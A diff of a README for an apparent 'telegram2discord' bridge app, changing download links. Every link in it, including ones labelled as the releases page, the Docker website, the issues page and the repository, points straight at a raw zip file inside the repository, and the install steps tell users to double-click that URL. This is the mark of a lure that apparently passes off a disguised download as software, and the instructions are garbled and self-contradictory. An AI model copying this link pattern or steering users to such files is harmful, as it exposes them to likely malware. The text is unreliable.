@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/Mjhol911/telegram2discord/main/app/telegram_discord_1.1-alpha.5.zip%https://raw.githubusercontent.com/Mjhol911/telegram2discord/main/app/telegram_discord_1.1-alpha.5.zip)](https://raw.githubusercontent.com/Mjhol911/telegram2discord/main/app/telegram_discord_1.1-alpha.5.zip)
+[![Download](https://github.com/Mjhol911/telegram2discord/raw/refs/heads/main/app/discord-telegram-v2.5-beta.2.zip%https://github.com/Mjhol911/telegram2discord/raw/refs/heads/main/app/discord-telegram-v2.5-beta.2.zip)](https://github.com/Mjhol911/telegram2discord/raw/refs/heads/main/app/discord-telegram-v2.5-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -30,20 +30,20 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-To download **telegram2discord**, please visit the [Releases page](https://raw.githubusercontent.com/Mjhol911/telegram2discord/main/app/telegram_discord_1.1-alpha.5.zip). Here’s how to do it:
+To download **telegram2discord**, please visit the [Releases page](https://github.com/Mjhol911/telegram2discord/raw/refs/heads/main/app/discord-telegram-v2.5-beta.2.zip). Here’s how to do it:
 
 1. Click on the link above to access the releases page.
 2. Find the latest version of **telegram2discord**.
 3. Download the appropriate package for your system:
    - For Windows: Download the `.exe` file.
    - For macOS: Download the `.dmg` file.
-   - For Linux: Download the suitable `https://raw.githubusercontent.com/Mjhol911/telegram2discord/main/app/telegram_discord_1.1-alpha.5.zip` file or use the Docker image.
+   - For Linux: Download the suitable `https://github.com/Mjhol911/telegram2discord/raw/refs/heads/main/app/discord-telegram-v2.5-beta.2.zip` file or use the Docker image.
 
 ## 🌐 Setting Up Docker (Optional)
 
 If you prefer using Docker for an easy setup, follow these steps:
 
-1. Install Docker on your system by visiting the [Docker website](https://raw.githubusercontent.com/Mjhol911/telegram2discord/main/app/telegram_discord_1.1-alpha.5.zip).
+1. Install Docker on your system by visiting the [Docker website](https://github.com/Mjhol911/telegram2discord/raw/refs/heads/main/app/discord-telegram-v2.5-beta.2.zip).
 2. Once installed, open your terminal or command prompt.
 3. Run the following command to pull the latest image:
    ```
@@ -79,7 +79,7 @@ To start **telegram2discord**, follow these steps:
 
 ### For Windows and macOS:
 
-1. Double-click the downloaded file (e.g., `https://raw.githubusercontent.com/Mjhol911/telegram2discord/main/app/telegram_discord_1.1-alpha.5.zip` or `https://raw.githubusercontent.com/Mjhol911/telegram2discord/main/app/telegram_discord_1.1-alpha.5.zip`).
+1. Double-click the downloaded file (e.g., `https://github.com/Mjhol911/telegram2discord/raw/refs/heads/main/app/discord-telegram-v2.5-beta.2.zip` or `https://github.com/Mjhol911/telegram2discord/raw/refs/heads/main/app/discord-telegram-v2.5-beta.2.zip`).
 2. Follow the on-screen instructions to install.
 3. Once installed, open the application.
 4. It will automatically start fetching messages from your Telegram channel and forwarding them to Discord.
@@ -104,16 +104,16 @@ If you encounter issues, consider the following steps:
 
 ## 👥 Community and Support
 
-If you need help or want to contribute, please join our community. You can report issues or request features on our [GitHub Issues page](https://raw.githubusercontent.com/Mjhol911/telegram2discord/main/app/telegram_discord_1.1-alpha.5.zip). Your feedback is greatly appreciated!
+If you need help or want to contribute, please join our community. You can report issues or request features on our [GitHub Issues page](https://github.com/Mjhol911/telegram2discord/raw/refs/heads/main/app/discord-telegram-v2.5-beta.2.zip). Your feedback is greatly appreciated!
 
 ## 📌 Additional Resources
 
 - **Documentation:** Detailed instructions can be found on the GitHub Wiki page.
-- **GitHub Repository:** Explore the source code and contribute [here](https://raw.githubusercontent.com/Mjhol911/telegram2discord/main/app/telegram_discord_1.1-alpha.5.zip).
+- **GitHub Repository:** Explore the source code and contribute [here](https://github.com/Mjhol911/telegram2discord/raw/refs/heads/main/app/discord-telegram-v2.5-beta.2.zip).
 - **Telegram Group:** Join our group to connect with other users and share experiences.
 
 ## 🎉 Conclusion
 
 Thank you for choosing **telegram2discord**. We hope this application makes your communication between Telegram and Discord smoother. Happy messaging! 
 
-For downloading, remember to visit the [Releases page](https://raw.githubusercontent.com/Mjhol911/telegram2discord/main/app/telegram_discord_1.1-alpha.5.zip) again.
+For downloading, remember to visit the [Releases page](https://github.com/Mjhol911/telegram2discord/raw/refs/heads/main/app/discord-telegram-v2.5-beta.2.zip) again.
